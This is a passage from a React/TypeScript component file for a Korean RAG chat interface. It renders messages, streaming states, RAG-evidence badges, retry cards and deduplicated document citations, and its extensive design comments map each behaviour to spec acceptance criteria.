import { memo } from "react";
import Markdown, { type Components } from "react-markdown";
import type { ChatSource } from "@/lib/api/messages";
import styles from "./MessageList.module.css";

/**
 * [Purpose] One transcript entry rendered by {@link MessageList}. A UI-level model, not a
 *   wire type -- distinct from `lib/api/messages.ts`'s `ChatChunk` (one SSE event) and
 *   `lib/api/conversations.ts` (conversation metadata).
 * [Caution] `streamStatus` only carries meaning for `role: "assistant"` -- a user message
 *   is always complete the moment it is sent, so it has no "streaming" state to track.
 * [Caution] `sources` carries meaning only for `role: "assistant"` and only distinguishes its
 *   values together with `streamStatus` (hybrid-rag Spec AC-21) -- `null` while
 *   `streamStatus === "streaming"` means "not yet known" (render nothing, clause ①); `null`
 *   once `streamStatus` is terminal (`"done"`/`"error"`) means "stream ended without ever
 *   receiving one" (`BL-019`, clause ③); an array (possibly empty) is the resolved value
 *   (clause ②, `AC-18`/`AC-20`); `undefined` means no stream was ever tracked for this
 *   message at all (e.g. loaded from history) and is deliberately distinct from `null` --
 *   see {@link ../chat-panel/MessageList}'s `SourceList` [Caution] for why collapsing the two
 *   is a defect, not a simplification. A caller must set this once, alongside the final
 *   `streamStatus` transition -- see {@link ../chat-panel/ChatPanel}'s `handleSend`. This same
 *   per-message field is also what makes `AC-22` (citations stay attached to the message that
 *   carried them, never bleed into a later turn) true for free -- there is no shared/global
 *   sources state to accidentally cross-contaminate.
 * [Caution] `ragEnabledAtSend` (user-reported defect fix, 2026-09-02) is the conversation's
 *   RAG setting *captured at the moment this turn was sent* -- the value the backend actually
 *   answered under. Deliberately per-message, not the conversation's *current* toggle value:
 *   flipping the header toggle must not retroactively relabel answers generated under the old
 *   setting (the observed defect: toggling OFF made every past RAG-ON answer render the
 *   "RAG 근거 미사용" badge and, once `SourceList` gained its AC-46 gate, hid its citations
 *   too). `undefined` means "unknown" -- a history-loaded row (`MessageResponse` carries no
 *   per-turn RAG flag) or a send made while the setting itself was unverified -- and renders
 *   neither the ON nor the OFF reading, the same three-state discipline the old conversation-
 *   level `ragEnabled` prop followed. Set once, at message creation, by {@link
 *   ../chat-panel/ChatPanel}'s `handleSend`; never updated afterwards. Carries meaning only
 *   for `role: "assistant"`, like `streamStatus`/`sources` above. Spec note: AC-24/AC-25/
 *   AC-43/AC-46 are worded conversation-level ("RAG 가 꺼진 대화의…") -- this per-message
 *   reading is a user-directed behavior change awaiting a Spec wording amendment.
 * [AC] hybrid-rag:AC-21, hybrid-rag:AC-22
 */
export interface ChatMessage {
  id: string;
  role: "user" | "assistant";
  content: string;
  streamStatus?: "streaming" | "done" | "error";
  sources?: ChatSource[] | null;
  ragEnabledAtSend?: boolean;
}

/** Fixed example-question chip labels for the empty-transcript state (Spec `P:158-160`,
 *  chat-prototype-port:AC-13). Kept private to this module -- AC-14's own test deliberately
 *  re-types these strings as literals rather than importing this constant (Spec §6
 *  discriminating-power requirement 4: comparing against the same constant a bug also uses
 *  would let a wrong value pass). */
const EXAMPLE_QUESTIONS = [
  "연차 이월 규정이 어떻게 되나요?",
  "법인카드 사용 한도는?",
  "보안 교육 이수 기한 알려줘",
] as const;

/**
 * [Purpose] Renders a conversation's messages, most recent last. An assistant message's
 *   `content` is rendered as markdown (chat:AC-37: headings/lists/fenced code blocks
 *   become real `<h*>`/`<ul>`-`<ol>`/`<pre><code>` elements, not literal `#`/`-`/```` ``` ````
 *   characters); a user message is rendered as plain text -- the user typed literal
 *   characters, so re-interpreting them as markdown would be surprising, and no AC asks
 *   for it (chat:AC-37's text is specifically about "응답", the assistant's response).
 *   When there are no messages yet, renders the prototype's empty-state copy plus three
 *   example-question chips (`insight-chat 프로토타입.html` P:154-155/P:158-160,
 *   chat-prototype-port:AC-12/AC-13) instead of the prior placeholder sentence.
 * [Rationale] `react-markdown` builds a React element tree itself; it never uses
 *   `dangerouslySetInnerHTML`, and raw HTML in the source is escaped by default because
 *   the `rehype-raw` plugin (the only thing that would re-enable it) is never added here.
 *   That default is exactly why this card's brief names `react-markdown` as the safe
 *   choice for rendering LLM output (untrusted input, per this project's RAG design) --
 *   see dev-log for the alternatives considered. The only customization on top of its
 *   defaults is {@link markdownComponents}'s `a` override (target/rel + a scheme allow-
 *   list); headings/lists/fenced code blocks all come from `react-markdown`'s stock
 *   CommonMark handling, so no `remark-gfm` (or any other plugin) is needed for this AC
 *   and none was added, keeping the added dependency surface to `react-markdown` alone.
 *   The empty state's text nodes are plain `<p>` elements, not `<h*>` headings -- this
 *   file's own test suite has no heading-level requirement for AC-12, and
 *   `ChatWorkspace.test.tsx`'s own `[Caution]` (`getByRole("heading", { level: 1 })`
 *   scoped to the conversation title) documents that no other `<h1>`/`<h2>`/`<h3>` renders
 *   anywhere in this component tree; introducing one here for decorative emphasis alone
 *   would falsify that documented invariant for no AC-backed reason.
 * [Caution] The RAG reading (`RAG 근거 미사용` badge, RAG-OFF notice box, `SourceList`'s AC-46
 *   gate) is per-message since 2026-09-02: every render site below reads the row's own
 *   `message.ragEnabledAtSend` (the send-time snapshot -- see {@link ChatMessage}'s own
 *   [Caution]), never the conversation's current toggle value. The old conversation-level
 *   `ragEnabled` prop applied the *current* toggle to every past row, so switching the header
 *   toggle OFF retroactively stamped "RAG 근거 미사용 · 모델 일반 지식" (and hid citations) on
 *   answers that were actually generated with RAG ON -- the user-reported defect this change
 *   fixes. The three-state discipline is unchanged (card T14 finishing work, Medium-1,
 *   chat-prototype-port:AC-42): `undefined` means "unknown" (a history-loaded row, or a send
 *   made while the setting was unverified -- card T16's `ragUnverified` gating upstream in
 *   {@link ../chat-workspace/ChatWorkspace} makes {@link ../chat-panel/ChatPanel} snapshot
 *   `undefined` then) and must render neither the ON nor the OFF reading; `TopBadge` and the
 *   RAG-OFF notice below still branch on `=== false` specifically, never a falsy check. The
 *   `ragEnabled` prop itself is retained in the type but ignored -- see its own doc line.
 * [Caution] `onExampleSelect` is called with the clicked chip's label exactly as it appears
 *   in {@link EXAMPLE_QUESTIONS} -- no trim, no transform (chat-prototype-port:AC-14 requires
 *   a character-for-character match against `streamAssistantReply`'s `message` argument).
 *   This component only owns the empty state and the click trigger (Spec §Tech Review AD-2:
 *   `messages.length === 0` already lived here pre-T7, and moving it to {@link
 *   ../chat-panel/ChatPanel} would orphan `MessageList.test.tsx`'s frozen baseline test name
 *   "shows a placeholder when there are no messages yet"); the actual send call is
 *   {@link ../chat-panel/ChatPanel}'s `handleSend`, reached through this callback.
 * [Caution] Card T10 (chat-prototype-port:AC-19/AC-20): `.map` below computes each row's
 *   `previousUserContent` here, not inside {@link MessageRow}, because only this level has the
 *   sibling index -- {@link ../chat-panel/ChatPanel}'s `handleSend` always pushes a turn as the
 *   pair `[...prev, userMessage, assistantMessage]`, so an assistant row at index `i` always has
 *   its own triggering user message at `i - 1`. Computed for every row (not gated to error rows
 *   only) so a row that later *becomes* an error (a live stream failing mid-turn) still resolves
 *   it correctly on that later re-render, instead of freezing whatever was true at first mount.
 *   `isSending` is threaded down the same way, for the same reason `MessageRow`'s own [Caution]
 *   gives for disabling the retry button while it is `true`.
 * [AC] chat:AC-37, chat-prototype-port:AC-12, chat-prototype-port:AC-13,
 *   chat-prototype-port:AC-14, chat-prototype-port:AC-19, chat-prototype-port:AC-20,
 *   chat-prototype-port:AC-24, chat-prototype-port:AC-25
 */
export function MessageList({
  messages,
  isSending = false,
  onExampleSelect,
  onRetry,
}: {
  messages: ChatMessage[];
  /** @deprecated Ignored since 2026-09-02 -- the RAG reading is per-message now
   *  (`ChatMessage.ragEnabledAtSend`, see this component's own [Caution] above). Kept in the
   *  type only so existing callers/tests still compile; removing it is the test owner's call. */
  ragEnabled?: boolean;
  /** Whether a turn is currently streaming, forwarded to every row so an error card's
   *  "다시 시도" button can be disabled while one is in flight (chat-prototype-port:AC-20) --
   *  see {@link MessageRow}'s own [Caution]. */
  isSending?: boolean;
  /** Fired with an example chip's exact label when clicked in the empty state
   *  (chat-prototype-port:AC-14) -- see this component's own [Caution]. */
  onExampleSelect?: (text: string) => void;
  /** Fired with the failed turn's own user-message text when an error card's "다시 시도"
   *  button is clicked (chat-prototype-port:AC-20) -- see this component's own [Caution]. */
  onRetry?: (text: string) => void;
}) {
  if (messages.length === 0) {
    return (
      <div className={styles.emptyState}>
        {/* Prototype P:152 -- decorative accent dot above the title. */}
        <span className={styles.emptyDot} aria-hidden="true" />
        <div>
          <p className={styles.emptyTitle}>무엇을 찾아드릴까요?</p>
          <p className={styles.emptyDescription}>
            사내 문서에 근거해서 답변합니다. 답변 아래에는 참고한 문서와 페이지가 함께 표시됩니다.
          </p>
        </div>
        <ul className={styles.exampleChips}>
          {EXAMPLE_QUESTIONS.map((question) => (
            <li key={question}>
              <button
                type="button"
                className={styles.exampleChip}
                onClick={() => onExampleSelect?.(question)}
              >
                {question}
              </button>
            </li>
          ))}
        </ul>
      </div>
    );
  }

  return (
    <ul className={styles.list} aria-label="대화 내용">
      {messages.map((message, index) => (
        <MessageRow
          key={message.id}
          message={message}
          isSending={isSending}
          previousUserContent={messages[index - 1]?.content}
          onRetry={onRetry}
        />
      ))}
    </ul>
  );
}

/**
 * [Purpose] Renders one transcript entry -- a user message as a right-aligned bubble
 *   (`insight-chat 프로토타입.html` P:197-199) and an assistant message as a left-aligned
 *   avatar + body column (P:204). The assistant body's top "badge slot" ({@link TopBadge})
 *   is a single conditional render point serving the mutually-exclusive states the
 *   prototype renders in the same position (P:338-353): the streaming indicator while
 *   `streamStatus === "streaming"` (chat-prototype-port:AC-15), or -- once the stream has
 *   ended -- a RAG-evidence summary covering both the OFF variant (chat-prototype-port:AC-24)
 *   and the two ON variants (card T15, chat-prototype-port:AC-43); see {@link TopBadge}'s own
 *   [Caution] for how the two badge families divide the cases. Extracted out of {@link
 *   MessageList}'s `.map` and wrapped in `React.memo` so that a SSE chunk which only changes
 *   the *streaming* message's `content` does not force every other, already-`"done"`,
 *   message to re-run its markdown parse (remark -> rehype -> React tree) on each chunk.
 * [Rationale] review 2026-08-29 Medium-5: `react-markdown`'s own `Markdown` export is not
 *   itself wrapped in `React.memo` (confirmed against `node_modules/react-markdown/lib/
 *   index.js`), so without a memo boundary here, `MessageList`'s parent `setMessages` call on
 *   every chunk creates a new messages array, `.map` creates a new element for every row
 *   regardless of whether that row's own data changed, and every row's `<Markdown>` re-parses
 *   its (unchanged) content from scratch. The custom comparator checks exactly the fields this
 *   component reads (`id`, `role`, `content`, `streamStatus`, `sources`, and -- since
 *   2026-09-02 -- `ragEnabledAtSend`) rather than relying on default shallow-prop-equality,
 *   because the `message` object itself is a new reference on every parent render regardless
 *   of memo.
 *   Deliberately *not* addressed here: the currently-streaming message's own repeated
 *   re-parsing as its content grows chunk-by-chunk. At this project's observed scale (chunks
 *   in the low tens, replies up to ~1750 chars, conversations up to ~6 messages -- review
 *   2026-08-29 Medium-5), that remaining re-parse work is bounded and was judged not worth a
 *   debounce or incremental-parse mechanism; only cross-message re-render waste is fixed here.
 * [Caution] The role label (`나`/`어시스턴트`) is visually hidden (`styles.visuallyHidden`),
 *   not removed -- the prototype's bubble/avatar screen carries no visible role text, but
 *   chat-prototype-port:AC-26 explicitly permits visual hiding as long as the DOM node still
 *   carries the text (accessibility default: color/position alone must not carry information
 *   for someone who cannot perceive layout -- handed to assistive tech as text instead). The
 *   avatar's `in` glyph is the opposite case -- purely decorative branding that would be
 *   redundant with the role label if announced, so it is `aria-hidden`.
 * [Caution] `data-testid={`message-${message.id}`}` stays on the *content* node for both
 *   roles (the bubble `<div>` for a user row, the markdown `<div>` for an assistant row), one
 *   level inside the `<li>` -- not moved to the `<li>` itself. Every existing query against it
 *   (`chat-prototype-port:AC-28`'s `design-system:AC-16` cases, and this file's own citation-
 *   area tests via `.closest("li")`) depends on that nesting continuing to hold.
 * [Caution] Card T10 (chat-prototype-port:AC-19/AC-20): a `streamStatus === "error"` row
 *   renders a `role="alert"` error card (title `응답을 받지 못했습니다`, a `다시 시도` button)
 *   below the markdown content -- `content` itself is rendered exactly as accumulated (Spec §8
 *   R-5: the already-arrived text is kept, never replaced by an inline failure sentence). The
 *   button hands `previousUserContent` (computed by {@link MessageList}'s `.map`, not here --
 *   see its own [Caution]) to `onRetry`; it does nothing if either is missing, matching the
 *   existing optional-callback convention `onExampleSelect` above already sets. It is
 *   `disabled` while `isSending` is true: without that guard, a stream started from the
 *   composer (turn 2) would leave this row's own `onRetry` closure memoized-stale
 *   (`React.memo`'s comparator below does not itself re-run this component when only
 *   `isSending` changes on a *different*, already-rendered error row) and clickable at the same
 *   time as the in-flight turn -- violating the one-stream-at-a-time invariant {@link
 *   ../chat-panel/ChatPanel}'s own top-of-file [Caution] documents. Passing `isSending` through
 *   the comparator too (not just using it in the JSX) is what keeps that closure fresh: it
 *   forces every row, not only the one whose own fields changed, to re-render whenever sending
 *   starts or stops.
 * [AC] chat-prototype-port:AC-15, chat-prototype-port:AC-16, chat-prototype-port:AC-19,
 *   chat-prototype-port:AC-20, chat-prototype-port:AC-24, chat-prototype-port:AC-25,
 *   chat-prototype-port:AC-26, chat-prototype-port:AC-43, chat-prototype-port:AC-46
 */
const MessageRow = memo(function MessageRow({
  message,
  isSending,
  previousUserContent,
  onRetry,
}: {
  message: ChatMessage;
  isSending: boolean;
  previousUserContent?: string;
  onRetry?: (text: string) => void;
}) {
  if (message.role === "user") {
    return (
      <li className={styles.userRow}>
        <span className={styles.visuallyHidden}>나</span>
        <div className={styles.userBubble} data-testid={`message-${message.id}`}>
          {message.content}
        </div>
      </li>
    );
  }

  return (
    <li className={styles.assistantRow}>
      {/* Decorative brand initial -- the role is already announced via the visually-hidden
          label below, so this would be a redundant, unlabeled announcement otherwise. */}
      <span className={styles.avatar} aria-hidden="true">
        in
      </span>
      <div className={styles.assistantBody}>
        <span className={styles.visuallyHidden}>어시스턴트</span>
        <TopBadge
          streamStatus={message.streamStatus}
          ragEnabledAtSend={message.ragEnabledAtSend}
          sources={message.sources}
        />
        <div
          className={styles.markdown}
          // A live region so a streaming reply's incremental growth is announced to
          // screen readers too, not only visible sighted users.
          role="status"
          aria-live="polite"
          aria-busy={message.streamStatus === "streaming"}
          data-testid={`message-${message.id}`}
        >
          <Markdown components={markdownComponents}>{message.content}</Markdown>
          {message.streamStatus === "streaming" && message.content === "" && (
            // 2026-09-02 (user decision, alongside the backend's app.chat.stream-timeout raise):
            // a reasoning model (e.g. qwen/qwen3.8-flash) can think for tens of seconds before
            // its first visible token, and the raised timeout makes that wait longer than it
            // was. Until then the row was an empty markdown div plus a blinking caret, which
            // read as "stuck" and invited a cancel. Shown only while nothing has arrived yet --
            // the first delta replaces it, so it never sits next to real content. Lives inside
            // the `role="status"` live region on purpose, so assistive tech hears the wait too.
            <span className={styles.thinking} data-testid="thinking-indicator">
              모델이 답변을 생각하는 중입니다
              <span className={styles.thinkingDots} aria-hidden="true">
                <span />
                <span />
                <span />
              </span>
            </span>
          )}
          {message.streamStatus === "streaming" && (
            // chat-prototype-port:AC-16 -- exactly one caret while streaming, none once the
            // stream ends. `prefers-reduced-motion: reduce` stops the blink (Spec §8 D-8) but
            // never removes this element -- AC-16 asserts the element's *presence*, not its
            // animation.
            <span className={styles.streamCaret} data-testid="stream-caret" aria-hidden="true" />
          )}
        </div>
        {message.streamStatus === "error" && (
          // chat-prototype-port:AC-19/AC-20 (card T10) -- replaces the old inline
          // "메시지를 가져오지 못했습니다." content rewrite entirely (Spec §8 AD-9): the
          // markdown content above is left exactly as accumulated, and this card is the only
          // place the failure itself is reported.
          <div className={styles.errorCard} role="alert">
            <p className={styles.errorCardTitle}>응답을 받지 못했습니다</p>
            <button
              type="button"
              className={styles.errorCardRetryButton}
              disabled={isSending}
              onClick={() => {
                if (previousUserContent !== undefined) onRetry?.(previousUserContent);
              }}
            >
              다시 시도
            </button>
          </div>
        )}
        <SourceList
          sources={message.sources}
          streamStatus={message.streamStatus}
          ragEnabledAtSend={message.ragEnabledAtSend}
        />
        {message.ragEnabledAtSend === false && (
          // chat-prototype-port:AC-25 -- reads the message's own send-time snapshot since
          // 2026-09-02 (see `ChatMessage.ragEnabledAtSend`'s [Caution]): the notice marks how
          // *this* answer was generated, so a later toggle flip must not add/remove it under
          // past answers. Still `=== false` specifically (card T14 finishing work, Medium-1),
          // never a falsy check (which also matches `undefined` -- unknown, e.g. history
          // rows). Not gated on `streamStatus`: this can render before the stream ends
          // (unlike the OFF badge above, which only appears once `TopBadge` reaches its
          // post-streaming branch) -- the prototype's own `showAnswerOff` block (P:269-294)
          // has no streaming/done split either.
          <div className={styles.ragOffNotice}>
            <svg
              width="17"
              height="17"
              viewBox="0 0 12 12"
              aria-hidden="true"
              className={styles.ragOffNoticeIcon}
            >
              <circle cx="6" cy="6" r="5" fill="none" stroke="currentColor" strokeWidth="1.3" />
              <path d="M6 5.2 V8.6" fill="none" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" />
              <circle cx="6" cy="3.5" r="0.7" fill="currentColor" />
            </svg>
            <p className={styles.ragOffNoticeText}>
              <strong>문서 근거 없이 답변했습니다.</strong> 사내 실제 규정과 다를 수 있습니다. 정확한 기준을
              보려면 오른쪽 위 <strong>문서 근거</strong> 토글을 켜고 다시 질문하세요.
            </p>
          </div>
        )}
      </div>
    </li>
  );
}, areMessagePropsEqual);

function areMessagePropsEqual(
  prev: {
    message: ChatMessage;
    isSending: boolean;
    previousUserContent?: string;
  },
  next: {
    message: ChatMessage;
    isSending: boolean;
    previousUserContent?: string;
  },
): boolean {
  return (
    prev.message.id === next.message.id &&
    prev.message.role === next.message.role &&
    prev.message.content === next.message.content &&
    prev.message.streamStatus === next.message.streamStatus &&
    prev.message.sources === next.message.sources &&
    prev.message.ragEnabledAtSend === next.message.ragEnabledAtSend &&
    // Card T10 -- `isSending` must force every row to re-render (not only the row whose own
    // `message`/`ragEnabled` changed), or an error card's `onRetry` closure below goes stale
    // while its `disabled` state does too -- see `MessageRow`'s own [Caution].
    prev.isSending === next.isSending &&
    prev.previousUserContent === next.previousUserContent
  );
}

/**
 * [Purpose] The assistant row's single top badge slot (Spec §8 AD-5) -- the mutually
 *   exclusive states the prototype renders in the same position: the streaming indicator
 *   (chat-prototype-port:AC-15) while the reply is still arriving, or -- once the stream has
 *   ended -- a summary of whether this answer used retrieved evidence at all.
 * [Rationale] `streamStatus === "streaming"` takes priority over `ragEnabledAtSend`: while a reply
 *   is still arriving there is no resolved RAG-evidence outcome to summarize yet, the same
 *   "not yet known, render nothing/something else" reasoning {@link SourceList} already
 *   applies to `sources === null` during streaming.
 * [Caution] T15 (user-approved 2026-09-02, AC-43) built the two RAG-ON badges -- "RAG 근거
 *   사용됨 · N건" / "RAG 켜짐 · 근거 문서 0건" (P:210/P:351, P:306) -- which Spec §Tech Review
 *   AD-5 (2026-08-31 correction) had found `hybrid-rag` T15 never built, only reporting the
 *   gap to the coordinator at the time rather than inventing the layout. `sources` is passed
 *   through *unmodified* (the array itself, not a count) so this function can reuse {@link
 *   isValidSourceList} -- the same malformed/`null`/`undefined` classification {@link
 *   SourceList} already applies to its own `sources` prop, whose four-state shape (`array |
 *   null | undefined`, plus the implicit "streaming" gate) is documented on that component's
 *   own [Caution]s. Reusing rather than re-deriving keeps the two render points structurally
 *   unable to disagree about what counts as "resolved" (AC-43's closing clause).
 * [Caution] `ragEnabledAtSend === false` (card T14 finishing work, Medium-1; per-message
 *   send-time snapshot since 2026-09-02, see {@link ChatMessage}'s own [Caution]), never a
 *   falsy check -- `ragEnabledAtSend === undefined` ("unknown": history rows, or a send made
 *   while the setting was unverified) must fall through to `null`, the same value the RAG-ON
 *   branch also returns for its own unresolved cases (AC-43 clauses ①④⑤⑥ below) -- never
 *   silently rendered as the OFF badge.
 * [AC] chat-prototype-port:AC-15, chat-prototype-port:AC-24, chat-prototype-port:AC-43
 */
function TopBadge({
  streamStatus,
  ragEnabledAtSend,
  sources,
}: {
  streamStatus: ChatMessage["streamStatus"];
  ragEnabledAtSend: boolean | undefined;
  /** Same prop {@link SourceList} receives, passed through unmodified -- see this function's
   *  own [Caution] for why an already-derived count would not do. */
  sources: ChatSource[] | null | undefined;
}) {
  if (streamStatus === "streaming") {
    return (
      <div className={`${styles.topBadge} ${styles.streamingBadge}`}>
        <svg
          width="11"
          height="11"
          viewBox="0 0 12 12"
          aria-hidden="true"
          className={styles.streamingBadgeIcon}
        >
          <circle
            cx="6"
            cy="6"
            r="4.6"
            fill="none"
            stroke="currentColor"
            strokeWidth="1.8"
            strokeLinecap="round"
            strokeDasharray="10 20"
          />
        </svg>
        생성 중 · 토큰 스트리밍
      </div>
    );
  }

  if (ragEnabledAtSend === false) {
    return (
      <div className={`${styles.topBadge} ${styles.ragOffBadge}`}>
        <svg width="11" height="11" viewBox="0 0 12 12" aria-hidden="true">
          <circle cx="6" cy="6" r="4.8" fill="none" stroke="currentColor" strokeWidth="1.4" />
          <path d="M2.6 9.4 L9.4 2.6" fill="none" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
        </svg>
        RAG 근거 미사용 · 모델 일반 지식
      </div>
    );
  }

  if (ragEnabledAtSend === true && streamStatus === "done" && isValidSourceList(sources)) {
    // User decision 2026-09-02: N counts distinct *documents* (the same fold `SourceList`'s
    // header/chips use, via the shared `uniqueSourceDocuments`), not retrieved chunks -- the
    // badge and the citation area must keep quoting the same number (AC-43's closing clause).
    const documentCount = uniqueSourceDocuments(sources).length;
    return documentCount > 0 ? (
      <div className={`${styles.topBadge} ${styles.ragUsedBadge}`}>
        <svg width="11" height="11" viewBox="0 0 12 12" aria-hidden="true">
          <path
            d="M1.6 6.3 L4.4 9.1 L10.4 3.1"
            fill="none"
            stroke="currentColor"
            strokeWidth="1.8"
            strokeLinecap="round"
            strokeLinejoin="round"
          />
        </svg>
        RAG 근거 사용됨 · {documentCount}건
      </div>
    ) : (
      <div className={`${styles.topBadge} ${styles.ragZeroBadge}`}>
        <svg width="11" height="11" viewBox="0 0 12 12" aria-hidden="true">
          <circle cx="5.2" cy="5.2" r="3.6" fill="none" stroke="currentColor" strokeWidth="1.4" />
          <path d="M7.9 7.9 L11 11" fill="none" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
        </svg>
        RAG 켜짐 · 근거 문서 0건
      </div>
    );
  }

  // undefined `ragEnabledAtSend` / `null`-or-`undefined` `sources` / `streamStatus === "error"` all
  // fall through to null -- AC-43 clauses ①④⑤⑥. Clause ② (OFF) and clause ③ (streaming) are
  // handled by the earlier branches above, not here.
  return null;
}

/**
 * [Purpose] Renders the citation area under an assistant reply -- hybrid-rag Spec `AC-18`
 *   (1+ sources), `AC-20` (confirmed-empty sources), and `AC-21`'s three-clause state model
 *   (streaming / resolved / stream-ended-but-never-resolved). Since 2026-09-02 (user decision)
 *   the resolved case lists distinct source *documents* -- deduped by `documentId`, filename
 *   only, no page suffix -- instead of one chip per retrieved chunk; the header count and
 *   `TopBadge`'s `N건` both quote that folded number via the shared
 *   {@link uniqueSourceDocuments}. Gated first, ahead of all of that, by
 *   `chat-prototype-port:AC-46`: an answer sent with RAG OFF renders no citation area at all,
 *   regardless of `streamStatus`/`sources`.
 * [Rationale] AC-46's gate exists because OFF means "never searched", which must not read as
 *   "searched and found nothing" -- `AC-20`'s confirmed-empty box below (「이 답변에는 근거 문서가
 *   없습니다」) is reserved for a RAG-ON answer that actually ran retrieval and got zero results;
 *   rendering it for an OFF answer as well (the pre-AC-46 defect, `BL-049`) misrepresents "we
 *   didn't look" as "we looked and there was nothing there".
 * [Rationale] `streamStatus` and `sources` are read together, not `sources` alone, because
 *   `sources === null` is ambiguous on its own -- it means "not yet known" while streaming
 *   (clause ①, render nothing) and "never arrived" once the stream has ended (clause ③,
 *   `BL-019`). Clause ③'s box is deliberately a different visual treatment (solid
 *   `--app-status-danger` border, not `AC-20`'s dashed `--app-line-strong`) so a delivery
 *   failure is never mistaken for a confirmed "no evidence" answer (Spec AC-21 ③'s explicit
 *   "AC-20 과 동일한 구조를 재사용하지 않는다"); the prototype has no reference screen for this
 *   state (it is a wire-defect case, not a design one), so the icon/border choice here is this
 *   card's own, not a ported value.
 * [Caution] `sources === undefined` (distinct from `null`) is a fourth case AC-21's three
 *   clauses do not cover: a message this component never tracked a stream for at all --
 *   today, `ChatWorkspace`'s history load (`toChatMessages`), which does not thread the
 *   backend's `MessageResponse.sources` through yet (Spec §2 "과거 대화 이력 재조회 화면의 출처
 *   표시" is explicitly out of scope for this card), **and** (card T9, chat-prototype-port
 *   Spec §Tech Review AD-4, user-approved 2026-09-01) a stream the user cancelled via the
 *   `생성 중단` button before any `sources` array ever arrived -- {@link ../chat-panel/ChatPanel}
 *   `handleSend`'s abort branch deliberately writes `sources: lastSources ?? undefined`, not
 *   `lastSources` alone, precisely to route a still-unresolved cancellation into *this* branch
 *   instead of clause ③ below. Collapsing either case into `null` would render clause ③'s
 *   "출처를 불러오지 못했습니다." on every historical reply or every user-cancelled stream,
 *   falsely implying a delivery failure that never happened (review 2026-08-31 High-1 for the
 *   history case; AD-4 option (a) rejected for the same reason on the cancellation case) -- so
 *   both render nothing instead, same as clause ①. A live-streamed message never hits this
 *   branch while still streaming: {@link ../chat-panel/ChatPanel} sets `sources: null`
 *   explicitly the moment it creates the message, before the stream starts, and only falls
 *   back to `undefined` here if that same stream is later cancelled with nothing resolved.
 * [Caution] `filename` reaches the wire unescaped (Spec T15 security Low-1) -- rendered only
 *   via JSX text interpolation below, never `dangerouslySetInnerHTML`. `sources` itself is
 *   also not trusted to actually be an array (review 2026-08-31 security Low-1) -- a malformed
 *   payload falls back to the clause ③ screen rather than throwing mid-render.
 * [Caution] `ragEnabledAtSend === false` (never a falsy check) short-circuits every clause
 *   below -- per-message send-time snapshot since 2026-09-02, see {@link ChatMessage}'s own
 *   [Caution]. `ragEnabledAtSend === undefined` ("unknown", same three-state value {@link
 *   TopBadge}'s own [Caution] documents) must still fall through to the existing
 *   `streamStatus`/`sources` state machine unchanged, or a message whose RAG reading is merely
 *   unknown (every history-loaded row today) would have its sources hidden even though they may
 *   exist (AC-45's history citation rendering relies on exactly this fall-through).
 *   `ragEnabledAtSend === true` also does not change this component's behavior at all --
 *   AC-46's closing clause ("RAG 가 켜진 대화에서는 기존 동작을 유지한다") is satisfied by leaving
 *   every clause below untouched, not by adding a parallel `true` branch.
 * [AC] hybrid-rag:AC-18, hybrid-rag:AC-19, hybrid-rag:AC-20, hybrid-rag:AC-21,
 *   chat-prototype-port:AC-46
 */
function SourceList({
  sources,
  streamStatus,
  ragEnabledAtSend,
}: {
  sources: ChatSource[] | null | undefined;
  streamStatus: ChatMessage["streamStatus"];
  ragEnabledAtSend: boolean | undefined;
}) {
  if (ragEnabledAtSend === false) {
    // AC-46: OFF-at-send means this message's own stream never ran a retrieval step, so it
    // outranks every streamStatus/sources state below -- none of those states can mean "found"
    // or "not found" when nothing was searched. Send-time snapshot, not the conversation's
    // current toggle (2026-09-02): a later toggle flip must not hide or reveal a past answer's
    // citations.
    return null;
  }

  if (streamStatus === "streaming" || streamStatus === undefined) {
    return null; // AC-21 clause (1): stream not yet ended -- nothing to show.
  }

  if (sources === undefined) {
    return null; // No stream was ever tracked for this message (e.g. loaded from history).
  }

  if (!isValidSourceList(sources)) {
    // Covers `null` (clause (3), BL-019: stream ended, sources never arrived), any non-array
    // value, and an array containing a malformed element (review 2026-08-31 round-2 security
    // Low-1: a single bad element, e.g. `[null]`, must not crash `uniqueSourceDocuments` or
    // the chip renderer mid-map -- rejecting the whole value here keeps the "rendered chips
    // match the distinct-document fold" guarantee intact for well-formed data instead of
    // silently dropping just the bad element).
    return (
      <div className={styles.sourcesFailed}>
        <span aria-hidden="true">⚠</span> 출처를 불러오지 못했습니다.
      </div>
    );
  }

  // User decision 2026-09-02: the citation area lists distinct source *documents* (filename
  // only, no page suffix), not one chip per retrieved chunk. The backend still sends one
  // Source per chunk (`ChatService#resolveSources`), so before this fold the same document
  // rendered once per retrieved page (observed: 5 chips "…pdf p.22 / p.3 / p.4 / p.1 / p.2"
  // for a single document). Supersedes hybrid-rag AC-19's "<filename> p.<page>" display rule
  // and AC-18's chip-count-equals-`sources.length` reading (Spec amendment pending).
  const documents = uniqueSourceDocuments(sources);

  return (
    <div className={styles.sources}>
      <div className={styles.sourcesHeader}>
        <span className={styles.sourcesLabel}>출처</span>
        <span className={styles.sourcesCount}>{documents.length}건</span>
      </div>
      {documents.length === 0 ? (
        <div className={styles.sourcesEmpty}>
          <span aria-hidden="true">✕</span> 이 답변에는 근거 문서가 없습니다.
        </div>
      ) : (
        <ul className={styles.sourceItems}>
          {documents.map((source) => (
            // `documentId` alone is a valid key now: `uniqueSourceDocuments` guarantees one
            // entry per document. (The pre-fold list needed page+index too -- review
            // 2026-08-31 Medium-2 -- because one document legitimately arrived once per
            // retrieved page.)
            <li key={source.documentId} className={styles.sourceItem}>
              {/* SourceChip's document glyph (decoded blob 2b98462d) -- decorative, contributes
                  no text, so the item's text content is still exactly the filename. */}
              <svg width="14" height="14" viewBox="0 0 14 14" aria-hidden="true" className={styles.sourceIcon}>
                <path d="M3 1.6 h5 l3 3 v7.8 h-8 Z" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinejoin="round" />
                <path d="M8 1.6 V4.6 H11" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinejoin="round" />
              </svg>
              {source.filename}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}

/** Distinct source documents -- deduped by `documentId`, first occurrence wins, retrieval
 *  order otherwise preserved (user decision 2026-09-02: the citation area shows *documents*,
 *  not retrieved chunks; the page-suffix display was removed outright, option ① over the
 *  merged-pages alternative). Shared by `TopBadge`'s `RAG 근거 사용됨 · N건` and
 *  `SourceList`'s header/chips so the two render points structurally cannot disagree about
